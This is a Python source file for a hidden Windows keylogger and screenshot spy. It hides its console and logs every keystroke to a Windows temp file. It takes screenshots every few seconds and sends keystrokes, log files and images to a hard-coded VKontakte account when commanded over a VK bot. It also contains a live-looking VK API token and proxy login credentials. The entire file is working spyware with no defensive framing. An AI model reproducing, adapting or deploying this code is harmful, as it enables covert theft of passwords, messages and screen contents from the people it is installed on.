import vk_api, logging, time, io, sys, os
from pynput.keyboard import Listener, _win32, Key
from datetime import datetime
from vk_api.utils import get_random_id
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
import requests
from PIL import ImageGrab, Image
import win32event
import win32api
import winerror
import win32console
import win32gui
from threading import Thread
from vk_api.upload import VkUpload
from multiprocessing import Queue

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit()
screens = ['скрины', 'скриншоты', 'экраны', 'шоты', 'screens']
mon = ['мониторить', 'mon', 'монитор', 'monitor']
screen = ['скрин', 'скриншот', 'экран', 'шот', 'screen']
log = ['log', 'лог']
logss = ['logs', 'логи', 'файл','file']
help_words = ['help', 'хелп', 'помощь', 'допомога', 'инструкция', 'doc']
proxies = {'http': 'http://Kucher_l:Larisa@192.168.1.1:8080', 'https': 'http://Kucher_l:Larisa@192.168.1.1:8080'}
os.environ["HTTPS_PROXY"] = 'http://Kucher_l:Larisa@192.168.1.1:8080'
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
ID = sys.argv[1]
vk_session = vk_api.VkApi(token="8fdd3950c91f17592d8f09890c86cfcc3d239cd9a9770240adf8e14adaadc233b2e7e943556d42e316707")
vk_session.http.proxies = {
    'http': 'http://Kucher_l:Larisa@192.168.1.1:8080',
    'https': 'https://Kucher_l:Larisa@192.168.1.1:8080'
}
vk = vk_session.get_api()
longpoll = VkBotLongPoll(vk_session, "181945713")
photos =[]
log_dir = 'C:/Windows/Temp/'
logs = []
count = 0
logging.basicConfig(filename=(log_dir+'log.txt'), level=logging.ERROR, format='%(message)s')


def on_press(key):
    global logs, count
    if len(logs) > 100:
        logs.pop(0)
    #logging.info(str(key))
    logging.error(str(key))
    logs.append(str(key))
    if "'@'" in logs:
        count += 1
        if count == 50:
            send_message(logs)
            count = 0


def Log():
    with Listener(on_press=on_press) as listener:
        listener.join()


def screen_shot():
    im = ImageGrab.grab()
    fp = io.BytesIO()
    im.save(fp, 'JPEG')
    fp.seek(0)
    return fp.getvalue()


def screen_shots():
    while True:
        a = vk.photos.getMessagesUploadServer()
        b = requests.post(a['upload_url'], files={'photo': ('screenshot.png', screen_shot(), 'image/png')}).json()
        photo = vk.photos.saveMessagesPhoto(server=b['server'], photo=b['photo'], hash=b['hash'])[0]
        d = f'photo{photo["owner_id"]}_{photo["id"]}'
        if len(photos) > 9:
            photos.pop(0)
        photos.append(d)
        time.sleep(5)


a = Thread(target=screen_shots)
a.start()
b = Thread(target=Log)
b.start()


def send_file(doc, id):
    upload = VkUpload(vk_session)
    a = upload.document_message(doc, f'{datetime.strftime(datetime.now(), "%H:%M %d.%m ")}', 'logs', '288345074')
    d = f'doc{a["doc"]["owner_id"]}_{a["doc"]["id"]}'
    vk.messages.send(
        peer_id=id,
        random_id=get_random_id(),
        message=f'Logs ID: {ID} | Time: {datetime.strftime(datetime.now(), "%H:%M %d.%m ")}',
        attachment=d,
    )


def send_photo(id):
    a = vk.photos.getMessagesUploadServer()
    b = requests.post(a['upload_url'], files={'photo': ('screenshot.png', screen_shot(), 'image/png')}).json()
    c = vk.photos.saveMessagesPhoto(server=b['server'], photo=b['photo'], hash=b['hash'])[0]
    d = f'photo{c["owner_id"]}_{c["id"]}'
    vk.messages.send(
        peer_id=id,
        random_id=get_random_id(),
        message=f'Скрин ID: {ID} | Время: {datetime.strftime(datetime.now(), "%H:%M %d.%m ")}',
        attachment=d,
    )


def send_message(text):
    vk.messages.send(
        user_id='288345074',
        random_id=get_random_id(),
        message=text)


for event in longpoll.listen():
    if event.type == VkBotEventType.MESSAGE_NEW:
        if event.obj.text != '':
            if event.message['text'].split()[0].lower() in log:
                if event.message['text'].split()[-1] == ID:
                    s = ''
                    for i in logs:
                        if i.count("'"):
                            i = i.replace("'", '')
                        s += i + ' '
                    send_message(s)
            if event.message['text'].split()[0].lower() in logss:
                if event.message['text'].split()[-1] == ID or event.message['text'].split()[1] == 'all':
                    log_txt = []
                    with open('C:/Windows/Temp/log.txt') as f:
                        for line in f:
                            log_txt.append(line)
                    s = ''
                    l = 150
                    for i in log_txt:
                        i = i.replace("'", '')
                        i = i.replace('\n', ' ')
                        i = i.replace('Key.', '')
                        s += i
                        if len(s) >= l:
                            s += '\n'
                            l += 150

                    with open('C:/Windows/Temp/abc.txt', 'w') as f:
                        f.write(s)
                    send_file(log_dir+'abc.txt', event.message['from_id'])
            if event.message['text'].split()[0].lower() in screens:
                if event.message['text'].split()[-1] == ID:
                    vk.messages.delete(delete_for_all=True)
                    vk.messages.send(
                        peer_id=event.message['from_id'],
                        random_id=get_random_id(),
                        attachment=photos,
                        message=f'Скрины ID: {ID} | Время: {datetime.strftime(datetime.now(), "%H:%M %d.%m ")}'
                    )

            if event.message['text'].split()[0].lower() in screen:
                if event.message['text'].split()[-1] == ID:
                    send_photo(event.message['from_id'])

            if event.message['text'].split()[0].lower() in mon:
                if event.message['text'].split()[-2] == ID:
                    for i in range(int(event.message['text'].split()[-1])):
                        send_photo(event.message['from_id'])
            if event.message['text'].lower() in help_words:
                send_message('''Показать скрин: скрин id (число от 1 до 30); Пример: "скрин id 5" 
                                Показать скины: скрины id (число от 1 до 30); Пример: "скрины id 7"
                                Логи клавиатуры: лог id (число от 1 до 30); Пример: лог id 3
                                ''')






